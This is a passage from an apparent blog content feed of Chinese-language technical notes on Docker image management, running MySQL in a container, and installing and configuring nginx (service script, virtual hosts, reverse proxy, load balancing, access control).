&lt;用户名&gt;/&lt;软件名&gt;。# 对于 Docker Hub，如果不给出用户名，则默认为 library，也就是官方镜像。docker pull ubuntudocker pull library/hello-worlddocker image pull library/hello-world</code></pre><blockquote><p>删除镜像</p></blockquote><pre><code>docker rmi [imageName]docker image rm [imageName]# 删除全部docker image rm $(docker image ls -q)docker image rm $(docker image ls -q redis)</code></pre><blockquote><p>更新镜像,提交版本</p></blockquote><pre><code>docker commit -m=&quot;has update&quot; -a=&quot;runoob&quot; e218edb10161 runoob/ubuntu:v2# 说明-m:提交的描述信息-a:指定镜像作者e218edb10161：容器IDrunoob/ubuntu:v2:指定要创建的目标镜像名</code></pre><blockquote><p>镜像体积</p></blockquote><pre><code># 查看镜像、容器、数据卷所占用的空间docker system df</code></pre><blockquote><p>虚悬镜像</p></blockquote><pre><code># 被同名镜像覆盖后，原镜像失去了name和tag就是虚悬镜像docker image ls -f dangling=true# 一般来说，虚悬镜像已经失去了存在的价值，是可以随意删除的，可以用下面的命令删除。$ docker image prune</code></pre><blockquote><p>查看提交历史</p></blockquote><pre><code>docker history 183dbef8eba6</code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 最小化构建.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E6%9C%80%E5%B0%8F%E5%8C%96%E6%9E%84%E5%BB%BA/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E6%9C%80%E5%B0%8F%E5%8C%96%E6%9E%84%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<ul><li>FROM scratch: (空镜像)</li><li>FROM busybox: (空镜像 + busybox)</li><li>FROM alpine:  (空镜像 + busybox + apk)apk,包管理工具</li></ul><p>例如： python:3.7-alpine</p><p>ldd：打印共享的依赖库</p><p>用 ldd 查出所需的 .so 文件<br>将所有依赖压缩成 rootfs.tar 或 rootfs.tar.gz，之后打进 scratch 基础镜像</p>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 运行mysql.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E8%BF%90%E8%A1%8Cmysql/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E8%BF%90%E8%A1%8Cmysql/</url>
      
        <content type="html"><![CDATA[<p>参考： <a href="https://blog.csdn.net/nzyalj/article/details/79177291" target="_blank" rel="noopener">https://blog.csdn.net/nzyalj/article/details/79177291</a></p><pre><code>docker pull mysqldocker run --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=1234 -d mysql—name 为设置容器的名字-p 端口映射-e 为设置执行时的环境变量,其他可参考官网-d 为设置镜像，镜像名:版本mysql -h 47.102.125.88 -P 3306 -u rootdocker run -it --link mysql:mysql --rm mysql sh -c &#39;exec mysql -h&quot;$MYSQL_PORT_3306_TCP_ADDR&quot; -p&#39;-it 使用交互模式–link 连接运行的容器 mysql.5.7.21 为之前首次运行时创建的容器名，冒号后为镜像名# 进入容器中的msyqldocker exec -it 9157649a7fdd mysql -h 127.0.0.1 -P 3306 -p</code></pre><p>2059错误解决</p><pre><code>原因： 最新的mysql8.0对用户密码的加密方式为caching_sha2_password, django暂时还不支持这种新增的加密方式。只需要将用户加密方式改为老的加密方式即可。一、use mysql; #选择数据库#本地#更改加密方式ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;current_passwd&#39; PASSWORD EXPIRE NEVER;#更新用户密码ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;new_passwd&#39;;#远程#更改加密方式ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;current_passwd&#39; PASSWORD EXPIRE NEVER;#更新用户密码ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;new_passwd&#39;;FLUSH PRIVILEGES; #刷新权限二、use mysql# 本地ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;new_passwd&#39;;# 远程ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;new_passwd&#39;;flush privileges;</code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 网络.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E7%BD%91%E7%BB%9C/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>nginx.md</title>
      <link href="/2019/12/02/deploy/server/nginx/"/>
      <url>/2019/12/02/deploy/server/nginx/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>Apache<br>Apache(Apache HTTP Server ）是目前广泛流行的Web 服务器软件，具有开放源代码、跨平台、安全稳定等特点。Apache 是伴随五联网的兴起共同成长的，经过多年的技术沉淀和积累，已经非常成熟和稳定，具备了大量的功能模块和扩展。但由于Apache 在设计之初对性能和资源的消耗没有过多的关注，导致在应对高并发的业务场景时，被一些轻量级的高性能Web 服务器赶超。</li></ul><ul><li>Tomcat<br>Tomcat(Apache Tomcat ）主要用于Java Web 环境，是一个运行Serviet 和JSP 的容器<br>（即运行Java 语言的服务器端程序） 。Tomcat 和Apache 都是由Apache 软件基金会运作的开源项目， Tomcat 本身可作为一个单独的Web 服务器使用，主要用于处理动态请求， 但在静态资源和高并发方面的性能较弱，因此经常和Apache 等软件搭配，实现动静态请求分离。</li></ul><ul><li>Nginx<br>Nginx （读作engine x ）是一个轻量级开源Web 服务器软件，可以作为反向代理、负载均衡与缓存服务器使用。Nginx 和Lighttpd 都是为高并发网站的应用场景而设计的。随着技术发展和业务需要， Nginx 逐渐受到关注，在国内如百度、淘宝、腾讯、新浪、网易等网站都开始使用Nginx 来满足一些高并发访问的需求。</li></ul><ul><li>Lighttpd</li><li>Microsoft IIS</li></ul><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><strong><em>系统环境</em>：阿里云 ubuntu16</strong></p><h2 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载"></a>1、下载</h2><blockquote><p>下载地址<br><a href="http://nginx.org/en/download.html" target="_blank" rel="noopener">nginx_down</a></p></blockquote><p>目前Nginx 发布了3 种类型的版本，分别为<br>Mainline version （开发版）<br>Stable version（稳定版）<br>Legacy versions （早期版本）<br>每种类型的版本中又提供了Linux 版本和Windows 版本</p><blockquote><p>下载解压后，目录结构如下</p></blockquote><ul><li>src 目录：存放Nginx 的源代码。</li><li>man 目录：存放Nginx 的帮助文档。</li><li>html 目录：存放默认网站文件。</li><li>contrib 目录：存放其他机构或组织贡献的文档资料。</li><li>conf 目录：存放Nginx 服务器的配置文件。</li><li>auto 目录：存放大量的脚本文件,和configure 脚本程序相关。</li><li>configure 文件： Nginx 自动安装脚本，用于检查环境，生成编译代码需要的makefile文件。</li><li>CHANGES 、CHANGES.ru 、LICENSE 和README 都是Nginx 服务器的相关文档资料。</li></ul><h2 id="2、安装依赖"><a href="#2、安装依赖" class="headerlink" title="2、安装依赖"></a>2、安装依赖</h2><blockquote><p>nginx编译安装依赖包</p></blockquote><table><thead><tr><th>软件包</th><th>说明</th></tr></thead><tbody><tr><td>pcre-devel</td><td>为Nginx 模块（如rewrite ）提供正则表达式库</td></tr><tr><td>zlib-devel</td><td>为Nginx 模块（如gzip ） 提供数据压缩用的共享库</td></tr><tr><td>openssl-dlevel</td><td>为Nginx 模块（如ssD 提供密码~法、证书以及SSL 协议等功能</td></tr></tbody></table><blockquote><p>Linux 中的某些软件包具有devel 包和非devel 包两种形式，如zlib 和zlib-devel。非devel 包就是普通的软件包，而devel 包则一般会包括头文件、静态库甚至源码。若仅仅使用这些软件，则仅安装非devel 包即可，但若在开发时常妥用到这些软件包中的共享库，就需要安装devel 包。</p></blockquote><h2 id="3、编译安装"><a href="#3、编译安装" class="headerlink" title="3、编译安装"></a>3、编译安装</h2><blockquote><p>安装脚本</p></blockquote><pre><code class="bash">#!/bin/bashapt update# 安装依赖# centos# yum -y install pcre-devel openssl-devel# ubuntuapt install openssl libssl-dev libpcre3 libpcre3-dev zlib1g-dev#下载wget http://nginx.org/download/nginx-1.14.2.tar.gz#解压tar -zxvf nginx-1.14.2.tar.gzcd nginx-1.14.2# 设置编译选项./configure --prefix=/usr/local/nginx --with-http_ssl_module#编译安装make &amp;&amp; make install</code></pre><h2 id="4、启动和停止"><a href="#4、启动和停止" class="headerlink" title="4、启动和停止"></a>4、启动和停止</h2><blockquote><p>启动</p></blockquote><pre><code class="bash">cd /usr/local/nginx/sbin./nginx# 查看运行装态ps aux | grep nginx</code></pre><blockquote><p>停止</p></blockquote><pre><code class="bash"># 快速关闭，不管有没有正在处理的请求./nginx -s stop# 优雅的关闭方式，Nginx在退出前完成已经接受的连接请求./nginx -s quit# 或者 杀进程kill Nginx主进程PID（以root运行的进程） # 1killall nginx  # 2</code></pre><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>nginx -s reload</td><td>在Nginx 已经启动的情况下重新加载配置文件（平滑重启）</td></tr><tr><td>nginx -s reopen</td><td>重新打开日志文件</td></tr><tr><td>nginx -c /特定目录/nginx.conf</td><td>以特定目录下的配置文件启动Nginx</td></tr><tr><td>nginx -t</td><td>检测当前配置文件是否正确</td></tr><tr><td>nginx - t -c /特定日录/nginx.conf</td><td>检测特定目录下的Nginx 配置文件是否正确</td></tr><tr><td>nginx - v</td><td>显示版本信息</td></tr><tr><td>nginx -V</td><td>显示版本信息和编译选项</td></tr></tbody></table><blockquote><p>Nginx 的进程设计思想<br>Nginx 由一个主进程和多个工作进程组成，主进程接收容户端请求，转交给工作进程处理，从而很好地利用多核心CPU 的计算能力。当管理员执行reload 命令重新加载配置时，主进程会等待工作进程完成工作后再结束工作进程，然后基于新的配直重新创建工作进程，避免了工作过程中被打断的情况。由于整个过程中主进程没有停止，因此也不会发生漏掉客户端请求的情况。</p></blockquote><blockquote><p>查看端口占用</p></blockquote><pre><code class="bash"># t 、l 、n 、p分别表示查看tcp协议、查看监昕服务、不解析名称以及显示进程名和PID netstat -tlnp</code></pre><blockquote><p>防火墙开放80端口(不同系统可能不一样,此处centos,一个参考)</p></blockquote><pre><code class="bash">iptables -I INPUT -p tcp --dport 80 -j ACCEPT# 查看端口状态service iptables status#保存，可以重启生效service iptables save# 重启service iptables restart</code></pre><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-I INPUT</td><td>表示在INPUTC 外部访问规则）中插入一条规则</td></tr><tr><td>-p tcp</td><td>指定数据包匹配的协议(tcp 、udp 、icmp 等)，这里指定tcp 协议</td></tr><tr><td>–dport 80</td><td>用于指定数据包匹配的目标端口号，这里指定80 端口</td></tr><tr><td>-j ACCEPT</td><td>指定对数据包的处理操作（ACCEPT、DROP、REJECt、REDIRECT等），这里指定ACCEPT 操作</td></tr></tbody></table><h1 id="5、其他操作"><a href="#5、其他操作" class="headerlink" title="5、其他操作"></a>5、其他操作</h1><h2 id="创建软链接"><a href="#创建软链接" class="headerlink" title="创建软链接"></a>创建软链接</h2><pre><code class="bash"># 查看当前环境变量echo $PATH# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games# 其中# /bin 和 /sbin 放置常用程序， sbin 表示需要管理员权限# /usr/bin 和 /usr/sbin 放置一些工具软件的可执行程序# /usr/local/bin 和/usr/local/sbin 放置用户自行安装的可执行程序# 因此，推荐将Nginx 放入/usr/local/sbin目录中。# 利用软链接将nginx 程序链接到/usr/local/sbin 目录中，从而创建nginx命令ln -s /usr/local/nginx/sbin/nginx /usr/local//sbin/nginx</code></pre><h2 id="添加到系统服务"><a href="#添加到系统服务" class="headerlink" title="添加到系统服务"></a>添加到系统服务</h2><blockquote><p>许多Linux 系统服务都可以通过service命令进行控制，service 命令实际上是调用了/etc/init.d 目录下的shell脚本</p></blockquote><pre><code class="bash">#例子#直接执行脚本/etc/init.d/network restart#等价于 通过service 命令执行脚本service network restart</code></pre><blockquote><p>接下来执行/etc/init.d/nginx 编写一个shell 脚本实现Nginx 服务管理，提供start 、stop 、quit、reload 、restart 5 个参数，具体代码如下。</p></blockquote><p>参考： <a href="https://www.cnblogs.com/boodoog/p/5844827.html" target="_blank" rel="noopener">LSB、服务</a></p><pre><code class="bash">#!/bin/bash  ### BEGIN INIT INFO# Provides:          zhuzhenyuan.cn# Required-Start:    $local_fs $network# Required-Stop:     $local_fs# Default-Start:     2 3 4 5# Default-Stop:      0 1 6# Short-Description: nginix service# Description:       nginix service daemon### END INIT INFO # LSB tags规范，上面这段内容有，就可以支持 systemctl enable nginx.service，或者直接 apt-get remove insservDAEMON=/usr/local/nginx/sbin/nginxcase &quot;$1&quot; in    start)        echo &quot;Starting nginx daemon...&quot;        $DAEMON &amp;&amp; echo &quot;NGINX RUN SUCCESS&quot;    ;;    stop)        echo &quot;Stopping nginx daemon...&quot;        $DAEMON -s stop &amp;&amp; echo &quot;NGINX STOP SUCCESS&quot;    ;;    quit)        echo &quot;Stopping nginx daemon...&quot;        $DAEMON -s quit &amp;&amp; echo &quot;NGINX QUIT SUCCESS&quot;    ;;    reload)        echo &quot;Reloading nginx daemon...&quot;        $DAEMON -s reload &amp;&amp; echo &quot;NGINX RELOAD SUCCESS&quot;    ;;    restart)        echo &quot;Restarting nginx daemon...&quot;        $DAEMON -s quit        $DAEMON &amp;&amp; echo &quot;RESTARTING NGINX SUCCESS&quot;    ;;    *)        echo &quot;Usage: dervice nginx{start|stop|quit|restart|reload}&quot;        exit 2    ;;esac</code></pre><p>[systemctl、service、chkconfig]（<a href="https://blog.csdn.net/cds86333774/article/details/51165361" target="_blank" rel="noopener">https://blog.csdn.net/cds86333774/article/details/51165361</a><br><a href="https://www.jb51.net/article/136559.htm" target="_blank" rel="noopener">服务systemctl 系统和服务管理器 参考</a></p><pre><code class="bash"># 添加权限chmod u+x /etc/init.d/nginx# unmask：取消对 unit 的注销。 systemctl unmask nginx.service# 添加服务到跟随系统启动，systemctl enable nginx.service</code></pre><blockquote><p>现在就可以使用 service的方式执行了</p></blockquote><blockquote><p>systemctl [command] [unit]</p></blockquote><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>start</td><td>立刻启动后面接的 unit。</td></tr><tr><td>stop</td><td>立刻关闭后面接的 unit。</td></tr><tr><td>restart</td><td>立刻关闭后启动后面接的 unit，亦即执行 stop 再 start 的意思。</td></tr><tr><td>reload</td><td>不关闭 unit 的情况下，重新载入配置文件，让设置生效。</td></tr><tr><td>enable</td><td>设置下次开机时，后面接的 unit 会被启动。</td></tr><tr><td>disable</td><td>设置下次开机时，后面接的 unit 不会被启动。</td></tr><tr><td>status</td><td>目前后面接的这个 unit 的状态，会列出有没有正在执行、开机时是否启动等信息。</td></tr><tr><td>is-active</td><td>目前有没有正在运行中。</td></tr><tr><td>is-enable</td><td>开机时有没有默认要启用这个 unit。</td></tr><tr><td>kill</td><td>不要被 kill 这个名字吓着了，它其实是向运行 unit 的进程发送信号。</td></tr><tr><td>show</td><td>列出 unit 的配置。</td></tr><tr><td>mask</td><td>注销 unit，注销后你就无法启动这个 unit 了。</td></tr><tr><td>unmask</td><td>取消对 unit 的注销。</td></tr></tbody></table><blockquote><p>linux 运行级别</p></blockquote><ul><li>运行级别0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动</li><li>运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登陆</li><li>运行级别2：多用户状态(没有NFS)</li><li>运行级别3：完全的多用户状态(有NFS)，登陆后进入控制台命令行模式</li><li>运行级别4：系统未使用，保留</li><li>运行级别5：X11控制台，登陆后进入图形GUI模式</li><li>运行级别6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动</li></ul><p>运行级别的原理：</p><ol><li>在目录/etc/init.d下有许多服务器脚本程序，一般称为服务(service)</li><li>在/etc下有7个名为rcN.d的目录，对应系统的7个运行级别, 存在rcS.d，为系统进入某个 runlevel 之前的 ) syetem init script</li><li>rcN.d目录下都是一些符号链接文件，这些链接文件都指向init.d目录下的service脚本文件，命名规则为K+nn+服务名或S+nn+服务名，其中nn为两位数字。</li><li>系统会根据指定的运行级别进入对应的rcN.d目录，并按照文件名顺序检索目录下的链接文件<ul><li>对于以K开头的文件，系统将终止对应的服务</li><li>对于以S开头的文件，系统将启动对应的服务</li></ul></li><li>查看运行级别用：runlevel</li><li>进入其它运行级别用：init N</li><li>另外init0为关机，init 6为重启系统</li></ol><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>打开conf下主配置文件查看</p><pre><code class="bash">vim /usr/local/nginx/conf/nginx.conf</code></pre><p>可看到主配置文件由5个块组成，如下</p><pre><code class="bash">mainevents{...}http{    server{        location{...}    }}</code></pre><table><thead><tr><th>块</th><th>说明</th></tr></thead><tbody><tr><td>main</td><td>主要控制Nginx 子进程所属的用户和用户组、派生子进程数、错误日志位置与级别、pid 位置、子进程优先级、进程对应CPU 、进程能够打开的文件描述符数目等</td></tr><tr><td>events</td><td>控制Nginx 处理连接的方式</td></tr><tr><td>http</td><td>Nginx 处理http 请求的主要配置块，大多数配置都在这里面进行</td></tr><tr><td>server</td><td>Nginx 中主机的配置块，可用于配置多个虚拟主机</td></tr><tr><td>location</td><td>server 中对应目录级别的控制块，可以有多个</td></tr></tbody></table><blockquote><p>查看默认的nginx.conf文件，去掉注释后</p></blockquote><pre><code class="bash">worker_processes  1;events {    worker_connections  1024;}http {    include       mime.types;    default_type  application/octet-stream;    sendfile        on;    keepalive_timeout  65;    server {        listen       80;        server_name  localhost;        location / {            root   html;            index  index.html index.htm;        }        error_page   500 502 503 504  /50x.html;        location = /50x.html {            root   html;        }    }}</code></pre><blockquote><p>默认配置指令</p></blockquote><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>worker_processes</td><td>配置Nginx 的工作进程数， 一般设为CPU 总核数或者总核数的两倍</td></tr><tr><td>worker_connections</td><td>配置Nginx 允许单个进程并发连接的最大请求数</td></tr><tr><td>include</td><td>用于引人配置文件</td></tr><tr><td>default_type</td><td>设置默认文件类型</td></tr><tr><td>sendfile</td><td>默认值为on ，表示开启高效文件传输模式</td></tr><tr><td>keepalive_timeout</td><td>设置长连接超时时间（单位：秒）</td></tr><tr><td>listen</td><td>监听端口，默认监听80 端口</td></tr><tr><td>server_name</td><td>设置主机域名</td></tr><tr><td>root</td><td>设置主机站点根目录地址</td></tr><tr><td>index</td><td>指定默认索引文件</td></tr><tr><td>error_page</td><td>自定义错误页面</td></tr></tbody></table><h2 id="虚拟主机配置"><a href="#虚拟主机配置" class="headerlink" title="虚拟主机配置"></a>虚拟主机配置</h2><h3 id="基于端口号配置虚拟主机"><a href="#基于端口号配置虚拟主机" class="headerlink" title="基于端口号配置虚拟主机"></a>基于端口号配置虚拟主机</h3><p>查看nginx.conf文件，如下</p><pre><code class="bash"># another virtual host using mix of IP-, name-, and port-based configuration# Nginx 中虚拟主机的配置可以基于IP地址、域名和端口号进行设置#server {#    listen       8000;  # 监昕端口，与下面一句二选一#    listen       somename:8080;#    server_name  somename  alias  another.alias;#    location / {#        root   html;#        index  index.html index.htm;#    }#}</code></pre><p>例子</p><pre><code class="bash"># 配置监听8001 端口号的虚拟主机server{    listen 8001;    server_name localhost;    root html/html8001;    index index.html index.htm;}# 配置监听8002 端口号的虚拟主机server{    listen 8002;    server_name localhost;    root html/html8002;    index index.html index.htm;}</code></pre><p>平滑重启生效</p><h3 id="基于域名配置虚拟主机"><a href="#基于域名配置虚拟主机" class="headerlink" title="基于域名配置虚拟主机"></a>基于域名配置虚拟主机</h3><p>域名可以采用改host的方式进行测试</p><pre><code>server{    listen 80;    server_name www.test.com;    root htmlwwwtestcom;    index index.html index.htm;}server{    listen 80;    server_name test.com;    root htmltestcom;    index index.html index.htm;}</code></pre><blockquote><p>server_name使用</p></blockquote><pre><code># 以*通配符开始的字符串server_name *.test.com;# 以*通配符结束的字符串server_name www.*;# 匹配正则表达式server_name ~^(?.+)\.domain\.com$;# 优先级顺序依次为，精准匹自己〉以通配符开始的字符串〉〉正则表达式</code></pre><h2 id="反向代理、负载均衡配置"><a href="#反向代理、负载均衡配置" class="headerlink" title="反向代理、负载均衡配置"></a>反向代理、负载均衡配置</h2><h3 id="配置反向代理"><a href="#配置反向代理" class="headerlink" title="配置反向代理"></a>配置反向代理</h3><pre><code>#域名区分server {    listen 80;    server_name www.test.com;    # 域名www.test.com的请求全部转发到Web服务器192.168.78.128    location / {        proxy_pass http://192.168.11.12;    }}server {    listen 80;    server_name test.com;    # 域名www.test.com的请求全部转发到Web服务器192.168.78.128    location / {        proxy_pass http://192.168.11.11:8007;    }}</code></pre><pre><code>#端口区分server {    listen 801;    server_name localhost;    # 本地端口801的请求全部转发到Web服务器192.168.78.128    location / {        proxy_pass http://192.168.11.12;    }}server {    listen 802;    server_name localhost;    # 本地端口802的请求全部转发到Web服务器192.168.78.128    location / {        proxy_pass http://192.168.11.11:8007;    }}</code></pre><p>其他常用指令</p><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>proxy_set_header</td><td>在将客户端请求发送给后端服务器之前，更改来自客户端的请求头信息</td></tr><tr><td>proxy_connect_timeout</td><td>配置Nginx与后端代理服务器尝试建立连接的超时时间</td></tr><tr><td>proxy_read_timeout</td><td>配置Nginx向后端服务器组发出read请求后，等待响应的超时时间</td></tr><tr><td>proxy_send_timeout</td><td>配置Nginx向后端服务器组发出write请求后，等待响应的超时时间</td></tr><tr><td>proxy_redirect</td><td>用于修改后端服务器返回的响应头中的Location和Refresh</td></tr></tbody></table><blockquote><p>proxy_set_header指令使用</p></blockquote><pre><code># 配置实现将客户端IP 传递给后端服务器。location / {    proxy_pass http://192.168.78.200;    proxy_set_header Host $host;  #第一个参数表示字段名称，第二个参数表示字段值    proxy_set_header X-Real-p $ remote_addr;  #$remote_addr用于获取客户端真实的IP 地址    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  # $proxy_add_x_forwarded_ for 用于在客户端请求头字段后添加客户端地址，使用逗号分隔，且当不存在客户端请求头字段时，该变量等同于变量$remote_addr 。}</code></pre><h3 id="负载均衡配置"><a href="#负载均衡配置" class="headerlink" title="负载均衡配置"></a>负载均衡配置</h3><blockquote><p>负载均衡（ load balance）就是将负载分摊到多个操作单元上执行,从而提高服务的可用性和响应速度，带给用户更好的体验。</p></blockquote><p>通过使用upstream指令实现.</p><p>以下是4中典型的配置方式</p><table><thead><tr><th>配置方式</th><th>说明</th></tr></thead><tbody><tr><td>轮询方式</td><td>负载均衡默认设置方式，每个请求按照时间顺序逐一分配到不同的后端服务器进行处理，如果有服务器宕机，会自动剔除</td></tr><tr><td>权重方式</td><td>利用weight 指定轮询的权重比率，与访问率成正比，用于后端服务器性能不均的情况</td></tr><tr><td>ip_hash 方式</td><td>每个请求按访问IP 的hash 结果分配，这样可以使每个访客固定访问一个后端服务器，可以解决Session 共享的问题</td></tr><tr><td>第三方模块</td><td>第三方模块采用fair 时，按照每台服务器的响应时间来分配请求，响应时间短的优先分配；若第三方模块采用url_hash 时，按照访问url 的hash 值来分配请求</td></tr></tbody></table><h4 id="一般轮询负载均衡"><a href="#一般轮询负载均衡" class="headerlink" title="一般轮询负载均衡"></a>一般轮询负载均衡</h4><p>例子</p><pre><code>server {    listen 80;    server_name www.test.com;    location / {        proxy_pass http://web_server;  #指定代理的URL    }}# 配置负载均衡服务器组upstream web_server {  # web_server表示代理的服务器主机名,用于proxy_pass 指令执行反向代理时使用    server 192.168.78.1;    server 192.168.78.2;}# Nginx 检测到后端某台服务器看机，则会在负载均衡时自动剔除该服务器</code></pre><h4 id="加权轮询负载均衡"><a href="#加权轮询负载均衡" class="headerlink" title="加权轮询负载均衡"></a>加权轮询负载均衡</h4><pre><code>upstream web_server {  # web_server表示代理的服务器主机名,用于proxy_pass 指令执行反向代理时使用    server 192.168.78.1 weight=1;    server 192.168.78.2 weight=3;}# weigth 参数表示权值，权值越高则被分配到的概率越大# Nginx 检测到后端某台服务器看机，则会在负载均衡时自动剔除该服务器</code></pre><p>除了 weight外，常用状态参数如下</p><table><thead><tr><th>配置方式</th><th>说明</th></tr></thead><tbody><tr><td>max_fails</td><td>允许请求失败的次数，默认为 1,当超过最大次数时，返回proxy_next_upstream指令定义的错误</td></tr><tr><td>fail_timeout</td><td>在经历了max_fails次失败后，暂停服务的时间。且在实际应用中max_fails 一般与fail_timeout 一起使用</td></tr><tr><td>backup</td><td>预留的备份机器</td></tr><tr><td>down</td><td>表示当前的s e rv er 暂时不参与负载均衡</td></tr></tbody></table><p>例子</p><pre><code>upstream web_server {  # web_server表示代理的服务器主机名,用于proxy_pass 指令执行反向代理时使用    server 192.168.78.1 weight=1 max_fails=2 fail_timeout=2;    server 192.168.78.2 weight=3 max_fails=2 fail_timeout=2;    server 193.168.78.3 backup;  # 当另外的非backup故障或者忙绿时，才会请求backup服务器}</code></pre><h4 id="ip-hash-负载均衡"><a href="#ip-hash-负载均衡" class="headerlink" title="ip_hash 负载均衡"></a>ip_hash 负载均衡</h4><blockquote><p>将每个请求按照访问IP 的hash 结果分配，这样就可以便来自同一个IP 的客户端用户固定访问一台Web 服务器，有效地解决了动态网页存在的Session 共享问题。</p></blockquote><p>例子</p><pre><code class="bash">upstream web_server {    ip_hash;  # 使用ip_hash 方式处理负载均衡时，Web服务器在负载均衡列表中的状态不能使用weight 和l backup 设置。    server 192.168.78.1;    server 192.168.78.2;    server 193.168.78.3 down;  # down 参数标识，在负载均衡时，会忽略该服务器的分配。(服务器宕机时)}</code></pre><blockquote><p>由于ip_hash 方式为每一个用户IP 绑定一个Web 服务器处理，将会导致某些Web 服务器接收的请求多，某些Web 服务器接到的请求少，无法保证Web 服务器的负载均衡。因此，建议只在必要的情况下使用这种方式</p></blockquote><h1 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h1><h5 id="设置用户和组"><a href="#设置用户和组" class="headerlink" title="设置用户和组"></a>设置用户和组</h5><blockquote><p>需要设置的用户和组已经创建</p></blockquote><pre><code># 1 编译安装配置方式,在./configure编译安装Nginx时选项中，# 添加如下,user用于指定用户名称，group 用于指定用户所在组的名称--user=&lt;user&gt;--group=&lt;group&gt;# 2 修改配置文件方式# 找到# user nobody;#修改为user nuser ngroup;# 重启服务</code></pre><h5 id="自定义错误页"><a href="#自定义错误页" class="headerlink" title="自定义错误页"></a>自定义错误页</h5><pre><code class="bash"># error_page 指令用于自定义错误页面， 500 、502 、503 和504 指的就是HTTP 错误代码， /50x . html 用于表示当发生上述指定的任意一个错误时，都使用网站根目录下的50x. html 文件处理error_page 500 502 503 504 /50x.html;# error_page 指令还可以指定单个错误的处理页面、利用在线资源处理指定的错误，更改网站响应的状态码# 为每种类型的错误设置单独的处理方式error_page 403 /40x.html;error_page 404 /404.jpg;# 利用在线资源进行处理错误error_page 403 http://example.com/forbidden.html;error_page 500 502 503 504 http://example.com/notfound.html;# 更改晌应状态码# 出现404的时候，浏览器响应信息中会得到自定义的码值200error_page 404 =200 /40x.html;# 另外，更改响应状态码时还可以不指定确切的码值，而是由重定向后实际处理的真实结果来决定error_page 404 = /40x.html;</code></pre><h5 id="权限控制指令"><a href="#权限控制指令" class="headerlink" title="权限控制指令"></a>权限控制指令</h5><pre><code>allow  # 用于设置允许访问的权限deny  # 用于设置禁止访问的权限# 在使用时，权限指令后只需跟上允许或禁止的IP,IP 段或all 即可。其中， all 表示所有的</code></pre><blockquote><p>注意</p></blockquote><ul><li>单个IP 指定作用范围最小， all 指定作用范围最大。</li><li>同一块下，若同时存在多个权限指令（ deny 、allow ） ，则先出现的访问权限设置生效，并且会对后出现的设置进行覆盖，未覆盖的范围依然生效，否则以先出现的设置为准。</li><li>当多个块（如http 、server 、location ）中都出现了权限设置指令，则内层块中的权限级别要比外层块中设置的权限级别高。</li></ul><p>例子</p><blockquote><p>默认如下</p></blockquote><pre><code class="bash">server {    listen       80;    server_name  localhost;    root   html;    index  index.html index.htm;}</code></pre><blockquote><p>禁止所有用户的访问</p></blockquote><pre><code class="bash">server {    listen       80;    server_name  localhost;    root   html;    index  index.html index.htm;    deny all;}</code></pre><blockquote><p>只允许指定用户访问</p></blockquote><pre><code class="bash">server {    listen       80;    server_name  localhost;    root   html;    index  index.html index.htm;    allow 10.240.172.253;    deny all;}</code></pre><blockquote><p>不同块间的权限指令优先级</p></blockquote><pre><code class="bash">http {    deny all;  # 对所有的server生效    server {        listen       80;        server_name  localhost;        root   html;        index  index.html index.htm;        allow all  # 优先级更高     }}</code></pre><h5 id="设置目录列表"><a href="#设置目录列表" class="headerlink" title="设置目录列表"></a>设置目录列表</h5><p>在找不到index.html时的会显示文件列表</p><pre><code class="bash">autoindex on;# 在http 块中，表示用于对所有站点都有效； 在server 块中，表示对指定站点有效；在location块中，表示对某个目录起作用# 设置显示文件的时间格式与大autoindex_exact_size  off;   #设置精准显示文件大小还是大概显示文件大小,以kB/ MB/ GB 为单位显示autoindex_localtime on;  #令设置文件最后一次修改时间,示显示的时间为文件的服务器时间。</code></pre><h5 id="自配置文件的引入"><a href="#自配置文件的引入" class="headerlink" title="自配置文件的引入"></a>自配置文件的引入</h5><pre><code>include file | mask;# file 用于指定包含的文件名称， 